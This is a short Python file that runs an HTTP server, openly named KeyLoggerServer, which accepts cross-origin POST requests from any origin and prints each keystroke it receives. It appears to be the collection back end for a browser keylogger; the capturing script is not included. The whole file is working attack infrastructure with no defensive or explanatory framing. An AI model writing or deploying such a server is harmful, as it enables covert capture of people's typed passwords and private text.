from http.server import BaseHTTPRequestHandler, HTTPServer
import json

class KeyLoggerServer(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_OPTIONS(self):
        self._set_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        key_data = json.loads(post_data)

        print(f"Received key: {key_data['key']}")

        self._set_headers()
        self.wfile.write(json.dumps({'message': 'Key received'}).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=KeyLoggerServer, port=5000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Server running at http://localhost:{port}')
    httpd.serve_forever()

if __name__ == "__main__":
    run()
